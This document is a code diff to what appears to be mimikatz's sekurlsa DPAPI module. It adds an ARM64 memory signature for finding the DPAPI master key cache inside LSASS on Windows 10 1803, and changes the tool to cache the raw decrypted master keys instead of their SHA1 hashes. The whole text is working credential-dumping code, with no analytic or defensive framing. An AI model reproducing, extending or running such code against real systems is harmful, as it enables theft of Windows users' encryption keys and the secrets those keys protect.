@@ -5,7 +5,12 @@
 */
 #include "kuhl_m_sekurlsa_dpapi.h"
 
-#ifdef _M_X64
+#if defined(_M_ARM64)
+BYTE PTRN_WI64_1803_MasterKeyCacheList[] = {0x09, 0xfd, 0xdf, 0xc8, 0x80, 0x42, 0x00, 0x91, 0x20, 0x01, 0x3f, 0xd6};
+KULL_M_PATCH_GENERIC MasterKeyCacheReferences[] = {
+	{KULL_M_WIN_BUILD_10_1803,	{sizeof(PTRN_WI64_1803_MasterKeyCacheList),	PTRN_WI64_1803_MasterKeyCacheList},	{0, NULL}, {16, 8}},
+};
+#elif defined(_M_X64)
 BYTE PTRN_W2K3_MasterKeyCacheList[]	= {0x4d, 0x3b, 0xee, 0x49, 0x8b, 0xfd, 0x0f, 0x85};
 BYTE PTRN_WI60_MasterKeyCacheList[]	= {0x49, 0x3b, 0xef, 0x48, 0x8b, 0xfd, 0x0f, 0x84};
 BYTE PTRN_WI61_MasterKeyCacheList[]	= {0x33, 0xc0, 0xeb, 0x20, 0x48, 0x8d, 0x05}; // InitializeKeyCache to avoid  version change
@@ -23,7 +28,7 @@ KULL_M_PATCH_GENERIC MasterKeyCacheReferences[] = {
 	{KULL_M_WIN_BUILD_10_1507,	{sizeof(PTRN_WI64_MasterKeyCacheList),	PTRN_WI64_MasterKeyCacheList},	{0, NULL}, {-7}},
 	{KULL_M_WIN_BUILD_10_1607,	{sizeof(PTRN_WI64_1607_MasterKeyCacheList),	PTRN_WI64_1607_MasterKeyCacheList},	{0, NULL}, {11}},
 };
-#elif defined _M_IX86
+#elif defined(_M_IX86)
 BYTE PTRN_WALL_MasterKeyCacheList[]	= {0x33, 0xc0, 0x40, 0xa3};
 BYTE PTRN_WI60_MasterKeyCacheList[]	= {0x8b, 0xf0, 0x81, 0xfe, 0xcc, 0x06, 0x00, 0x00, 0x0f, 0x84};
 KULL_M_PATCH_GENERIC MasterKeyCacheReferences[] = {
@@ -78,11 +83,9 @@ BOOL CALLBACK kuhl_m_sekurlsa_enum_callback_dpapi(IN PKIWI_BASIC_SECURITY_LOGON_
 								{
 									(*pData->lsassLocalHelper->pLsaUnprotectMemory)(aKey.address, mesCredentials.keySize);
 									kprintf(L"\n\t * MasterKey :\t"); kull_m_string_wprintf_hex(aKey.address, mesCredentials.keySize, 0);
+									kuhl_m_dpapi_oe_masterkey_add(&mesCredentials.KeyUid, aKey.address, mesCredentials.keySize);
 									if(kull_m_crypto_hash(CALG_SHA1, aKey.address, mesCredentials.keySize, dgst, SHA_DIGEST_LENGTH))
-									{
 										kprintf(L"\n\t * sha1(key) :\t"); kull_m_string_wprintf_hex(dgst, SHA_DIGEST_LENGTH, 0);
-										kuhl_m_dpapi_oe_masterkey_add(&mesCredentials.KeyUid, dgst, SHA_DIGEST_LENGTH);
-									}
 								}
 								LocalFree(aKey.address);
 							}
